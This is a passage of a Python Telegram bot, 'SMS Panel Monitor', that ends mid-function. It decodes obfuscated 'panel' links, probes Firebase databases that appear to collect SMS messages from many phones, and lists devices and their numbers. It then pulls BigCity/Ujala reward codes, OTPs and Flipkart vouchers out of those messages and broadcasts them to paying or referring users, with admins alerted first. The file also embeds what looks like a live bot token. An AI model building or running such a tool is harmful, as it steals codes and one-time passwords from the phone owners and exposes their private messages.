"""
SMS Panel Monitor — Universal
==================================
- Accepts ANY web panel or Firebase link (no format limits)
- Monitors every panel type automatically
- Detects BigCity/Ujala reward SMS specifically
- No generic pattern — only targeted reward detection
- Channel join gate (3 channels required)
- Refer system: 3 refers = 1 hour access
- Admins get alerts 10s earlier (silent)
- Admin-only panel management + Give Time to members
- Broadcast to all authorized users
"""

import asyncio
import json
import os
import re
import sys
import time
import base64
import logging
import httpx
from datetime import datetime
from pathlib import Path
from urllib.parse import parse_qs, urlparse

from telegram import (
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    ReplyKeyboardMarkup,
    Update,
)
from telegram.ext import (
    Application,
    CallbackQueryHandler,
    CommandHandler,
    ContextTypes,
    MessageHandler,
    filters,
)
from telegram.error import TelegramError

# ── Logging ───────────────────────────────────────────────────────────────────
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)
logger = logging.getLogger(__name__)

# ── Config ────────────────────────────────────────────────────────────────────
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8646908060:AAGzfWQcu6vDIXKbZTgYuJ-e0ueIHcAOqN8")
ADMIN_IDS = {1446058092, 6894923643}

REQUIRED_CHANNELS = [
    {"username": "blankkdealz",     "url": "https://t.me/blankkdealz",      "label": "📢 Blank Dealz"},
    {"username": "earnwithsakx",    "url": "https://t.me/earnwithsakx",     "label": "💰 Earn With Sakx"},
    {"username": "blankdealzzchat", "url": "https://t.me/blankdealzzchat",  "label": "💬 Blank Dealz Chat"},
]

ADMIN_ALERT_DELAY   = 10
MONITOR_INTERVAL    = 15
REFERRALS_FOR_1H    = 3
ACCESS_HOURS        = 1

STATE_FILE  = Path(__file__).parent / "bot_state.json"
USERS_FILE  = Path(__file__).parent / "users.json"
PANELS_FILE = Path(__file__).parent / "panels.json"
SMS_FILE    = Path(__file__).parent / "sms.txt"

MAX_CONCURRENT_REQUESTS = 30
IS_INITIALIZED = False

_semaphore: asyncio.Semaphore | None = None

def get_semaphore() -> asyncio.Semaphore:
    global _semaphore
    if _semaphore is None:
        _semaphore = asyncio.Semaphore(MAX_CONCURRENT_REQUESTS)
    return _semaphore

# ── Message Patterns (BigCity + Ujala + Flipkart only) ───────────────────────
# BigCity / Ujala reward SMS patterns
REWARD_BIGCITY_PATTERN = re.compile(
    r"Reward Code for\s+Ujala\s+\w+\s+Consumer\s+promo\s+is\s+([A-Z0-9]+)",
    re.IGNORECASE,
)
REWARD_BIGCITY_CODE = re.compile(
    r"(?:reward|promo|code)\s+(?:is|:)\s+([A-Z0-9]{6,25})",
    re.IGNORECASE,
)
REWARD_BIGCITY_SENDER = re.compile(
    r"BGCITY|BIGCITY|JK-BGCITY",
    re.IGNORECASE,
)

# Flipkart voucher (real format: no PIN, just voucher code)
REWARD_FLIPKART_PATTERN = re.compile(
    r"Flipkart Gift Voucher is ([A-Z0-9]+)",
    re.IGNORECASE,
)


# ── JSON helpers ──────────────────────────────────────────────────────────────
def load_json(path, default):
    if path.exists():
        try:
            with open(path, "r") as f:
                return json.load(f)
        except Exception as e:
            logger.error(f"Error loading {path}: {e}")
    return default

def save_json(path, data):
    try:
        with open(path, "w") as f:
            json.dump(data, f, indent=2)
    except Exception as e:
        logger.error(f"Error saving {path}: {e}")

def load_panels():  return load_json(PANELS_FILE, {})
def save_panels(p): save_json(PANELS_FILE, p)
def load_state():   return load_json(STATE_FILE, {})
def save_state(s):  save_json(STATE_FILE, s)

# ── Flipkart SMS file save ───────────────────────────────────────────────────
def save_flipkart_sms(sender: str, voucher: str, message: str, device_id: str, panel_name: str, dt: str = ""):
    """BigCity side se aaya Flipkart SMS sms.txt mein append karta hai."""
    try:
        timestamp = dt if dt else datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        entry = (
            f"[{timestamp}]\r\n"
            f"Panel  : {panel_name}\r\n"
            f"Device : {device_id}\r\n"
            f"Sender : {sender}\r\n"
            f"Voucher: {voucher}\r\n"
            f"Message: {message}\r\n"
            f"{'─' * 50}\r\n"
        )
        with open(SMS_FILE, "a", encoding="utf-8") as f:
            f.write(entry)
        logger.info(f"Flipkart SMS saved to sms.txt — voucher: {voucher}")
    except Exception as e:
        logger.error(f"save_flipkart_sms error: {e}")

# ── User management ───────────────────────────────────────────────────────────
def load_users() -> dict:
    return load_json(USERS_FILE, {})

def save_users(u: dict):
    save_json(USERS_FILE, u)

def get_user(uid: int) -> dict | None:
    return load_users().get(str(uid))

def upsert_user(uid: int, **kwargs):
    users = load_users()
    key   = str(uid)
    if key not in users:
        users[key] = {
            "username":       "",
            "access_expiry":  0,
            "referrals_given": 0,
            "referred_by":    None,
            "joined_at":      int(time.time()),
        }
    users[key].update(kwargs)
    save_users(users)
    return users[key]

def has_access(uid: int) -> bool:
    if uid in ADMIN_IDS:
        return True
    u = get_user(uid)
    if not u:
        return False
    return u.get("access_expiry", 0) > time.time()

def grant_access_hours(uid: int, hours: int = ACCESS_HOURS) -> float:
    u   = get_user(uid)
    now = time.time()
    current_expiry = u.get("access_expiry", now) if u else now
    new_expiry     = max(current_expiry, now) + hours * 3600
    upsert_user(uid, access_expiry=new_expiry)
    return new_expiry

def get_all_user_ids() -> list[int]:
    return [int(k) for k in load_users().keys()]

# ── Channel membership check ──────────────────────────────────────────────────
async def check_channels(bot, uid: int) -> list[dict]:
    not_joined = []
    for ch in REQUIRED_CHANNELS:
        try:
            member = await bot.get_chat_member(f"@{ch['username']}", uid)
            if member.status in ("left", "kicked", "banned"):
                not_joined.append(ch)
        except TelegramError:
            not_joined.append(ch)
    return not_joined

def channel_join_keyboard(not_joined: list[dict]) -> InlineKeyboardMarkup:
    buttons = [[InlineKeyboardButton(ch["label"], url=ch["url"])] for ch in not_joined]
    buttons.append([InlineKeyboardButton("✅ I've Joined — Check", callback_data="check_join")])
    return InlineKeyboardMarkup(buttons)

# ── Universal Panel URL Decoder ──────────────────────────────────────────────
def decode_zxkai(s: str):
    try:
        b64    = s.replace("-", "+").replace("_", "/")
        padded = b64 + "=" * ((4 - len(b64) % 4) % 4)
        bin_data = base64.b64decode(padded)
        K   = "ZXKAIv1_Xk9mP2wN7qL4vR6jH3cF8yT1ZbE5sA09"
        dec = bytearray(bin_data[i] ^ ord(K[i % len(K)]) for i in range(len(bin_data)))
        obj = json.loads(dec.decode("utf-8"))
        if obj.get("u") and obj.get("k"):
            return obj["u"], obj["k"]
    except Exception:
        pass
    return None, None

def decode_profex(s: str):
    try:
        padded  = s + "=" * ((4 - len(s) % 4) % 4)
        decoded = base64.b64decode(padded).decode("utf-8")
        if "|||" in decoded:
            parts = decoded.split("|||")
            return parts[0], (parts[1] if len(parts) > 1 else "")
    except Exception:
        pass
    return None, None

def decode_base64_param(s: str):
    """Try plain base64 decode (for any panel that uses ?s= with base64)."""
    try:
        padded  = s + "=" * ((4 - len(s) % 4) % 4)
        decoded = base64.b64decode(padded).decode("utf-8")
        # Check if it looks like a URL
        if decoded.startswith("http"):
            parts = decoded.split("|")
            return parts[0].strip(), (parts[1].strip() if len(parts) > 1 else "")
    except Exception:
        pass
    return None, None

def get_panel_api_url(panel_url: str):
    """
    UNIVERSAL decoder — accepts ANY panel format:
      1. ZXKAI encoded          — ?s=<xor-base64>
      2. Profex encoded         — ?s=<base64-with-|||>
      3. Plain base64 ?s=       — ?s=<base64-of-url>
      4. Raw Firebase           — https://xxx.firebaseio.com
      5. Firebase + auth key    — https://xxx.firebaseio.com?auth=KEY
      6. Firebase + ?s= failing — fallback to raw URL
      7. Any other URL          — try as-is (web panel API)
      8. Any URL with ?key=     — extract key param
    """
    parsed  = urlparse(panel_url)
    qs      = parse_qs(parsed.query)

    # ── Try ?s= encoded params first ─────────────────────────────────────────
    s_param = qs.get("s", [""])[0]
    if s_param:
        # Try ZXKAI
        url, key = decode_zxkai(s_param)
        if url:
            return url.rstrip("/"), key

        # Try Profex
        url, key = decode_profex(s_param)
        if url:
            return url.rstrip("/"), key

        # Try plain base64
        url, key = decode_base64_param(s_param)
        if url:
            return url.rstrip("/"), key

    # ── Direct Firebase URL (no ?s= or ?s= failed to decode) ────────────────
    if ".firebaseio.com" in panel_url or ".firebasedatabase.app" in panel_url:
        url = panel_url.split("?")[0].split(".json")[0].rstrip("/")
        auth_key = ""
        for k, v in qs.items():
            if k.lower() in ("key", "auth", "secret", "token"):
                auth_key = v[0]
                break
        return url, auth_key

    # ── Any other URL — try as a web panel API ───────────────────────────────
    # Strip query params, look for auth/key in them
    url = panel_url.split("?")[0].rstrip("/")
    auth_key = ""
    for k, v in qs.items():
        if k.lower() in ("key", "auth", "secret", "token", "apikey", "api_key"):
            auth_key = v[0]
            break
    return url, auth_key

# ── Firebase API helpers ──────────────────────────────────────────────────────
async def api_fetch(client, url, timeout=15):
    async with get_semaphore():
        try:
            resp = await client.get(url, timeout=timeout)
            if resp.status_code == 200:
                return resp.json(), None
            return None, f"HTTP {resp.status_code}"
        except Exception as e:
            return None, str(e)

def fb_url(base: str, auth_key: str = "", **extra) -> str:
    """Firebase URL builder — correct ? vs & handling (no missing-? bug)."""
    params = {}
    if auth_key:
        params["auth"] = auth_key
    params.update(extra)
    if not params:
        return base
    sep = "&" if "?" in base else "?"
    return base + sep + "&".join(f"{k}={v}" for k, v in params.items())

def is_firebase_push_id(k: str) -> bool:
    """Firebase auto-generated push keys start with - and are ~20 chars."""
    return bool(re.match(r'^-[A-Za-z0-9_-]{15,25}$', k))

# Sentinel for flat structures (no device grouping)
_FLAT_DEVICE = "__flat__"

_DEVICE_BLACKLIST = {
    "messages", "clients", "devices", "users", "all_devices", "nodes",
    "settings", "sms", "logs", "info", "config", "meta", "state", "data",
    "stats", "admin", "webhook", "subscriptions", "commands", "pending",
    "queue", "inbox", "outbox", "sent", "received", "history", "archive",
    "online", "offline", "status", "token", "tokens", "session", "auth",
    "push", "notify", "notifications", "alerts", "events", "records",
    "phones", "numbers", "contacts", "groups", "chats", "conversations",
    "texts", "incoming", "outgoing", "drafts", "spam", "trash", "deleted",
    "sim", "sim1", "sim2", "network", "signal", "battery", "location",
    "version", "app", "server", "client", "account", "profile", "setup",
    "smslogs", "smslog", "msglogs", "msglog", "allsms", "smsdata",
}

def is_valid_device_id(k):
    """Accept any key that looks like a real device/SIM identifier."""
    if not isinstance(k, str) or not k:
        return False
    if k.lower() in _DEVICE_BLACKLIST:
        return False
    if is_firebase_push_id(k):
        return False
    return 3 <= len(k) <= 80

async def discover_structure(client, api_url, auth_key):
    """
    UNIVERSAL structure discovery — handles ALL Firebase layouts:
    A. Flat push IDs at root (no device grouping)
    B. Device IDs at root, messages directly under each device
    C. Device IDs at root, messages under /msg_node/{device_id}/
    D. Container node -> device IDs -> messages
    E. Top-level message node keyed by device
    """
    KNOWN_MSG = (
        "messages", "sms", "logs", "msg", "inbox", "texts",
        "conversations", "chats", "incoming", "outbox", "received",
        "smslogs", "smslog", "msglogs", "msglog", "allsms", "smsdata",
    )
    KNOWN_DEV = (
        "clients", "devices", "users", "all_devices", "nodes",
        "phones", "connections", "online", "active", "registered",
        "mobiles", "handsets", "sims", "slots",
    )

    root_data, error = await api_fetch(client, fb_url(f"{api_url}/.json", auth_key))
    if not root_data or not isinstance(root_data, dict):
        root_data, error = await api_fetch(
            client, fb_url(f"{api_url}/.json", auth_key, shallow="true")
        )
    if not root_data or not isinstance(root_data, dict):
        return None, error

    keys = list(root_data.keys())

    # Case A: root keys are Firebase push IDs → flat message collection
    push_keys = [k for k in keys if is_firebase_push_id(k)]
    if push_keys and len(push_keys) >= max(1, len(keys) * 0.5):
        return _FLAT_DEVICE, ""

    # Case B/C: device IDs directly at root
    root_devs = [k for k in keys if is_valid_device_id(k)]
    if root_devs:
        for m_node in KNOWN_MSG:
            if m_node in keys:
                nd, _ = await api_fetch(
                    client, fb_url(f"{api_url}/{m_node}/.json", auth_key, shallow="true")
                )
                if isinstance(nd, dict):
                    if any(is_firebase_push_id(k) for k in nd):
                        return _FLAT_DEVICE, m_node
                    if any(k in nd for k in root_devs[:5]):
                        return "", m_node
        sample = root_devs[0]
        samp, _ = await api_fetch(
            client, fb_url(f"{api_url}/{sample}/.json", auth_key, shallow="true")
        )
        if isinstance(samp, dict):
            for m_node in KNOWN_MSG:
                if m_node in samp:
                    return "", m_node
        return "", ""

    # Case D: device IDs under a container node
    check_order = (
        [k for k in KNOWN_DEV if k in keys] +
        [k for k in keys if k not in KNOWN_MSG and k not in KNOWN_DEV]
    )
    for node in check_order:
        nd, _ = await api_fetch(
            client, fb_url(f"{api_url}/{node}/.json", auth_key, shallow="true")
        )
        if not isinstance(nd, dict):
            continue
        sub = list(nd.keys())
        sub_push = [k for k in sub if is_firebase_push_id(k)]
        if sub_push and len(sub_push) >= max(1, len(sub) * 0.5):
            return _FLAT_DEVICE, node
        devs = [k for k in sub if is_valid_device_id(k)]
        if devs:
            samp, _ = await api_fetch(
                client, fb_url(f"{api_url}/{node}/{devs[0]}/.json", auth_key, shallow="true")
            )
            if isinstance(samp, dict):
                for m_node in KNOWN_MSG:
                    if m_node in samp:
                        return node, m_node
            return node, ""

    # Case E: top-level message node keyed by device
    for m_node in KNOWN_MSG:
        if m_node in keys:
            nd, _ = await api_fetch(
                client, fb_url(f"{api_url}/{m_node}/.json", auth_key, shallow="true")
            )
            if isinstance(nd, dict):
                if any(is_firebase_push_id(k) for k in nd):
                    return _FLAT_DEVICE, m_node
                if any(is_valid_device_id(k) for k in nd):
                    return "", m_node

    return None, error

async def get_device_list(client, api_url, auth_key, device_node):
    if device_node == _FLAT_DEVICE:
        return [_FLAT_DEVICE], None
    path = f"/{device_node}" if device_node else ""
    url  = fb_url(f"{api_url}{path}/.json", auth_key, shallow="true")
    data, error = await api_fetch(client, url, 15)
    if error:
        return None, error
    if not data or not isinstance(data, dict):
        return [], None
    return [k for k in data.keys() if is_valid_device_id(k)], None

async def get_messages(client, api_url, auth_key, message_node, device_id, limit=10) -> dict:
    if device_id == _FLAT_DEVICE:
        path = f"/{message_node}" if message_node else ""
        url  = fb_url(f'{api_url}{path}/.json?orderBy="%24key"&limitToLast={limit}', auth_key)
        data, _ = await api_fetch(client, url, 15)
        if isinstance(data, dict) and data:
            return data
        url2 = fb_url(f"{api_url}{path}/.json", auth_key, limitToLast=limit)
        data2, _ = await api_fetch(client, url2, 15)
        return data2 if isinstance(data2, dict) else {}
    path = f"/{message_node}" if message_node else ""
    url  = fb_url(f'{api_url}{path}/{device_id}/.json?orderBy="%24key"&limitToLast={limit}', auth_key)
    data, _ = await api_fetch(client, url, 15)
    if isinstance(data, dict) and data:
        return data
    if message_node:
        url2 = fb_url(f'{api_url}/{device_id}/.json?orderBy="%24key"&limitToLast={limit}', auth_key)
        data2, _ = await api_fetch(client, url2, 15)
        if isinstance(data2, dict) and data2:
            return data2
    return {}

_PHONE_FIELDS = (
    "number", "phoneNumber", "phone", "fromNumber", "to", "sim_number",
    "simNumber", "mobile", "mobileNumber", "msisdn", "phoneNo",
    "device_number", "deviceNumber", "simNo", "callerNumber",
    "Number", "Phone", "Mobile", "To", "SIM",
)
_PHONE_RE = re.compile(r'(?<!\d)(\+?[0-9]{9,15})(?!\d)')

async def get_device_number(client, api_url, auth_key, device_node, device_id) -> str:
    if device_id == _FLAT_DEVICE:
        return ""
    path = f"/{device_node}" if device_node else ""
    url  = fb_url(f"{api_url}{path}/{device_id}/.json", auth_key)
    data, _ = await api_fetch(client, url, 10)
    if not isinstance(data, dict):
        return ""
    for field in _PHONE_FIELDS:
        if field in data and data[field]:
            return str(data[field])
    for v in data.values():
        if isinstance(v, dict):
            for field in _PHONE_FIELDS:
                if field in v and v[field]:
                    return str(v[field])
            for vv in v.values():
                if isinstance(vv, dict):
                    for field in _PHONE_FIELDS:
                        if field in vv and vv[field]:
                            return str(vv[field])
    def _scan(obj, d=0):
        if d > 3 or not isinstance(obj, dict):
            return ""
        for val in obj.values():
            if isinstance(val, str):
                m = _PHONE_RE.search(val)
                if m:
                    return m.group(1)
            r = _scan(val, d + 1)
            if r:
                return r
        return ""
    return _scan(data)

# ── Message classification (BigCity focused) ─────────────────────────────────
def classify_message(text: str, sender: str = ""):
    """
    Detect BigCity/Ujala reward SMS and Flipkart vouchers.
    Returns (type, reward_data) or (None, None).
    """
    # ── BigCity / Ujala reward code ──────────────────────────────────────────
    m = REWARD_BIGCITY_PATTERN.search(text)
    if m:
        return "bigcity_reward", m.group(1)

    # ── Flipkart voucher ─────────────────────────────────────────────────────
    m = REWARD_FLIPKART_PATTERN.search(text)
    if m:
        return "flipkart", m.group(1)   # single voucher code, no PIN

    # ── BigCity reward code (alternate pattern) ──────────────────────────────
    if REWARD_BIGCITY_SENDER.search(sender):
        m = REWARD_BIGCITY_CODE.search(text)
        if m:
            return "bigcity_reward", m.group(1)

    # ── BigCity OTP (informational alert) ────────────────────────────────────
    if REWARD_BIGCITY_SENDER.search(sender):
        m = OTP_BIGCITY_PATTERN.search(text)
        if m:
            return "bigcity_otp", m.group(1)

    # ── Any SMS from BigCity sender (catch-all) ──────────────────────────────
    if REWARD_BIGCITY_SENDER.search(sender):
        # Look for any 4-6 digit code in the message
        m = re.search(r'(?<!\d)(\d{4,6})(?!\d)', text)
        if m:
            return "bigcity_code", m.group(1)
        # Return the full message as a BigCity alert
        return "bigcity_sms", text[:200]

    return None, None

# ── Alert formatting ──────────────────────────────────────────────────────────
def format_reward(device_id, sender, message, reward_data,
                  panel_name, msg_type, number="", dt="") -> str:

    if msg_type == "bigcity_reward":
        code_text = f"🎁 *Reward Code:* `{reward_data}`"
    elif msg_type == "bigcity_otp":
        code_text = f"🔑 *OTP:* `{reward_data}`"
    elif msg_type == "bigcity_code":
        code_text = f"🔢 *Code:* `{reward_data}`"
    elif msg_type == "bigcity_sms":
        code_text = f"📨 *BigCity SMS received*"
    elif msg_type == "flipkart":
        code_text = f"🎁 *Flipkart Voucher:* `{reward_data}`"
    else:
        code_text = ""

    num_line = f"🔢 *Number:* `{number}`\n" if number else ""

    # Type label
    type_labels = {
        "bigcity_reward": "🏆 BIGCITY REWARD",
        "bigcity_otp": "🔑 BIGCITY OTP",
        "bigcity_code": "🔢 BIGCITY CODE",
        "bigcity_sms": "📨 BIGCITY SMS",
        "flipkart": "🛒 FLIPKART VOUCHER",
    }
    type_label = type_labels.get(msg_type, "📢 ALERT")

    return (
        f"🚨 *{type_label}*\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📱 *Panel:* {panel_name}\n"
        f"📲 *Device:* `{device_id}`\n"
        f"{num_line}"
        f"📨 *From:* {sender}\n"
        f"⏰ *Time:* {dt}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{code_text}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📄 *Message:*\n{message}\n"
    )

# ── Broadcast with admin-first delay ─────────────────────────────────────────
async def _do_broadcast_alert(app, text: str):
    all_uids = get_all_user_ids()

    for uid in ADMIN_IDS:
        try:
            await app.bot.send_message(
                chat_id=uid, text=text,
                parse_mode="Markdown", disable_web_page_preview=True,
            )
        except Exception as e:
            logger.error(f"Admin alert error [{uid}]: {e}")

    await asyncio.sleep(ADMIN_ALERT_DELAY)

    for uid in all_uids:
        if uid in ADMIN_IDS:
            continue
        if not has_access(uid):
            continue
        try:
            await app.bot.send_message(
                chat_id=uid, text=text,
                parse_mode="Markdown", disable_web_page_preview=True,
            )
        except Exception as e:
            logger.error(f"Member alert error [{uid}]: {e}")

def broadcast_alert(app, text: str):
    asyncio.create_task(_do_broadcast_alert(app, text))

# ── Monitor job ───────────────────────────────────────────────────────────────
async def process_device(client, panel_key, panel_config,
                         device_id, state, app, is_new_panel):
    api_url    = panel_config.get("api_url")
    auth_key   = panel_config.get("auth_key", "")
    msg_node   = panel_config.get("message_node", "")
    dev_node   = panel_config.get("device_node", "")
    panel_name = panel_config.get("name", "Unknown")
    new_sent   = 0

    try:
        messages = await get_messages(client, api_url, auth_key, msg_node, device_id, limit=10)
        if not messages:
            return 0

        for msg_key, msg_data in messages.items():
            if not isinstance(msg_data, dict):
                continue

            msg_id   = str(msg_data.get("id", msg_key))
            full_key = f"{panel_key}:{device_id}:{msg_id}"

            if state.get(full_key):
                continue

            # On first run or newly added panel — mark as seen, don't alert
            if not IS_INITIALIZED or is_new_panel:
                state[full_key] = True
                continue

            _TF = (
                "message", "body", "text", "msg", "sms", "content",
                "smsBody", "messageBody", "SMS", "Message", "Body", "Text",
                "smsbody", "messagebody", "rawData", "smstext", "msgtext",
                "description", "detail", "rawtext", "msgBody", "smsContent",
                "data", "payload", "smsMessage", "notification",
            )
            message_text = ""
            for f in _TF:
                v = msg_data.get(f)
                if isinstance(v, str) and v.strip():
                    message_text = v
                    break
            if not message_text:
                for nv in msg_data.values():
                    if isinstance(nv, dict):
                        for f in _TF:
                            v = nv.get(f)
                            if isinstance(v, str) and v.strip():
                                message_text = v
                                break
                    if message_text:
                        break

            _SF = (
                "sender", "from", "address", "number", "source",
                "fromAddress", "phoneNumber", "from_number", "originator",
                "Sender", "From", "Address", "Number", "phoneNo",
                "sim", "simNumber", "device_number", "senderNumber",
                "senderAddress", "originatingAddress",
            )
            sender = "Unknown"
            for f in _SF:
                v = msg_data.get(f)
                if isinstance(v, str) and v.strip():
                    sender = v
                    break
            if sender == "Unknown":
                for nv in msg_data.values():
                    if isinstance(nv, dict):
                        for f in _SF:
                            v = nv.get(f)
                            if isinstance(v, str) and v.strip():
                                sender = v
                                break
                    if sender != "Unknown":
                        break

            dt = ""
            for dtf in ("dateTime", "time", "timestamp", "date", "created_at",
                        "createdAt", "sentAt", "receivedAt", "DateTime",
                        "Timestamp", "received", "sent", "arrival"):
                v = msg_data.get(dtf)
                if v is not None:
                    dt = str(v)
                    break

            if not message_text:
                continue

            msg_type, reward_data = classify_message(str(message_text), str(sender))
            if not msg_type:
                state[full_key] = True
                continue

            number = await get_device_number(client, api_url, auth_key, dev_node, device_id)
            text   = format_reward(device_id, sender, message_text, reward_data,
                                   panel_name, msg_type, number, dt)

            broadcast_alert(app, text)
            # BigCity Flipkart SMS → sms.txt mein save karo
            if msg_type == "flipkart":
                save_flipkart_sms(
                    sender=str(sender),
                    voucher=str(reward_data),
                    message=str(message_text),
                    device_id=device_id,
                    panel_name=panel_name,
                    dt=str(dt),
                )
            state[full_key] = True
            new_sent += 1

    except Exception as e:
        logger.error(f"process_device error [{panel_key}/{device_id}]: {e}")

    return new_sent

async def monitor_panels(context: ContextTypes.DEFAULT_TYPE):
    global IS_INITIALIZED
    app    = context.application
    panels = load_panels()
    state  = load_state()

    total_new          = 0
    any_new_panel_init = False

    async with httpx.AsyncClient() as client:
        for panel_key, panel_config in list(panels.items()):
            api_url  = panel_config.get("api_url")
            if not api_url:
                continue

            auth_key     = panel_config.get("auth_key", "")
            init_key     = f"init:{panel_key}"
            is_new_panel = not state.get(init_key, False)

            try:
                if panel_config.get("device_node") is None:
                    dev_node, msg_node = await discover_structure(client, api_url, auth_key)
                    if dev_node is not None:
                        panel_config["device_node"] = dev_node
                        panel_config["message_node"] = msg_node
                        save_panels(panels)
                    else:
                        continue

                dev_node   = panel_config.get("device_node")
                device_ids, error = await get_device_list(client, api_url, auth_key, dev_node)

                if not device_ids:
                    if is_new_panel:
                        state[init_key] = True
                    continue

                tasks = [
                    process_device(client, panel_key, panel_config,
                                   device_id, state, app, is_new_panel)
                    for device_id in device_ids
                ]
                results    = await asyncio.gather(*tasks)
                total_new += sum(results)

                if is_new_panel:
                    state[init_key]    = True
                    any_new_panel_init = True

            except Exception as e:
                logger.error(f"Monitor error [{panel_key}]: {e}")

    if not IS_INITIALIZED:
        IS_INITIALIZED = True
        save_state(state)
        logger.info("Bot initialized — monitoring active.")
        return

    if total_new > 0 or any_new_panel_init:
        save_state(state)

# ── Access gate (non-admin handlers) ─────────────────────────────────────────
async def gate_user(update: Update, bot) -> bool:
    uid = update.effective_user.id
    if uid in ADMIN_IDS:
        return True

    not_joined = await check_channels(bot, uid)
    if not_joined:
        kb = channel_join_keyboard(not_joined)
        await update.effective_message.reply_text(
            "📢 *Bot use karne ke liye pehle in channels ko join karo:*",
            parse_mode="Markdown",
            reply_markup=kb,
        )
        return False

    if not has_access(uid):
        u      = get_user(uid)
        refs   = u.get("referrals_given", 0) if u else 0
        needed = REFERRALS_FOR_1H - (refs % REFERRALS_FOR_1H)
        bot_info = await bot.get_me()
        await update.effective_message.reply_text(
            f"⛔ *Access expired ya nahi hai.*\n\n"
            f"🔗 *Refer karke access pao:*\n"
            f"Har 3 referrals = 1 ghante ka access\n\n"
            f"Tumhara referral link:\n"
            f"`https://t.me/{bot_info.username}?start=r{uid}`\n\n"
            f"Current referrals: `{refs}`\n"
            f"Aur `{needed}` refer karo = 1 ghanta access",
            parse_mode="Markdown",
        )
        return False

    return True

# ── /start ────────────────────────────────────────────────────────────────────
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid      = update.effective_user.id
    username = update.effective_user.username or ""
    args     = context.args or []

    upsert_user(uid, username=username)

    if args and args[0].startswith("r"):
        try:
            referrer_id = int(args[0][1:])
            if referrer_id != uid:
                u = get_user(uid)
                if u and u.get("referred_by") is None:
                    upsert_user(uid, referred_by=referrer_id)
                    ref_data = get_user(referrer_id)
                    if ref_data is not None:
                        old_refs = ref_data.get("referrals_given", 0)
                        new_refs = old_refs + 1
                        upsert_user(referrer_id, referrals_given=new_refs)
                        if new_refs % REFERRALS_FOR_1H == 0:
                            expiry  = grant_access_hours(referrer_id, ACCESS_HOURS)
                            exp_str = datetime.fromtimestamp(expiry).strftime("%H:%M %d/%m")
                            try:
                                await context.bot.send_message(
                                    chat_id=referrer_id,
                                    text=(
                                        f"🎉 *Congratulations!*\n\n"
                                        f"Tumhare {new_refs} referrals ho gaye!\n"
                                        f"✅ *1 ghante ka access mil gaya!*\n"
                                        f"Expires: `{exp_str}`"
                                    ),
                                    parse_mode="Markdown",
                                )
                            except Exception:
                                pass
                        else:
                            remaining = REFERRALS_FOR_1H - (new_refs % REFERRALS_FOR_1H)
                            try:
                                await context.bot.send_message(
                                    chat_id=referrer_id,
                                    text=(
                                        f"👥 *New referral!*\n\n"
                                        f"Total: {new_refs} | "
                                        f"Aur {remaining} chahiye access ke liye"
                                    ),
                                    parse_mode="Markdown",
                                )
                            except Exception:
                                pass
        except (ValueError, IndexError):
            pass

    if uid not in ADMIN_IDS:
        not_joined = await check_channels(context.bot, uid)
        if not_joined:
            kb = channel_join_keyboard(not_joined)
            await update.message.reply_text(
                "👋 *Welcome!*\n\n"
                "📢 Pehle in channels ko join karo, phir bot use kar sakte ho:",
                parse_mode="Markdown",
                reply_markup=kb,
            )
            return

    await show_main_menu(update, context)

# ── Main menu ─────────────────────────────────────────────────────────────────
async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid      = update.effective_user.id
    is_admin = uid in ADMIN_IDS

    if is_admin:
        keyboard = ReplyKeyboardMarkup(
            [["📊 Status",    "📋 My Panels"],
             ["➕ Add Panel", "❌ Remove Panel"],
             ["👥 Users",     "📨 Broadcast"],
             ["⏱ Give Time"]],
            resize_keyboard=True,
        )
        role = "👑 *Admin*"
    else:
        keyboard = ReplyKeyboardMarkup(
            [["📊 Status",   "🔗 My Referral"],
             ["⏳ My Access"]],
            resize_keyboard=True,
        )
        role = "👤 *Member*"

    bot_info = await context.bot.get_me()
    ref_link = f"https://t.me/{bot_info.username}?start=r{uid}"

    u      = get_user(uid)
    refs   = u.get("referrals_given", 0) if u else 0
    expiry = u.get("access_expiry", 0) if u else 0

    if uid in ADMIN_IDS:
        access_str = "♾ Unlimited (Admin)"
    elif expiry > time.time():
        exp_str    = datetime.fromtimestamp(expiry).strftime("%H:%M %d/%m/%Y")
        access_str = f"✅ Active till {exp_str}"
    else:
        needed     = REFERRALS_FOR_1H - (refs % REFERRALS_FOR_1H)
        access_str = f"⛔ None  |  {needed} more refer needed"

    panels = load_panels()
    panel_count = len(panels)

    await update.effective_message.reply_text(
        f"🤖 *SMS Panel Monitor — Universal*\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"Role: {role}\n"
        f"Access: {access_str}\n"
        f"Referrals: {refs}\n"
        f"📦 Panels: {panel_count}\n"
        f"🔗 Your link: `{ref_link}`\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 Chat ID: `{uid}`",
        parse_mode="Markdown",
        reply_markup=keyboard,
    )

# ── Check join callback ───────────────────────────────────────────────────────
async def check_join_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    uid = query.from_user.id

    not_joined = await check_channels(context.bot, uid)
    if not_joined:
        kb = channel_join_keyboard(not_joined)
        await query.edit_message_text(
            "❌ *Abhi bhi kuch channels join nahi kiye:*",
            parse_mode="Markdown",
            reply_markup=kb,
        )
    else:
        await query.edit_message_text(
            "✅ *Sab channels join ho gaye! Welcome!*",
            parse_mode="Markdown",
        )
        await show_main_menu(update, context)

# ── Status ────────────────────────────────────────────────────────────────────
async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await gate_user(update, context.bot):
        return

    panels = load_panels()
    users  = load_users()
    text   = "📊 *Monitor Status*\n━━━━━━━━━━━━━━━━━━━━━━\n\n"
    total_devices = 0

    async with httpx.AsyncClient() as client:
        for panel_key, panel_config in panels.items():
            api_url      = panel_config.get("api_url")
            auth_key     = panel_config.get("auth_key", "")
            panel_name   = (panel_config.get("name", "Unknown")
                            .replace("*", "").replace("_", "").replace("`", ""))
            device_count = 0

            if not api_url:
                status = "🔴 Link Error"
            else:
                try:
                    dev_node = panel_config.get("device_node")
                    if dev_node is None:
                        dev_node, _ = await discover_structure(client, api_url, auth_key)
                    if dev_node is not None:
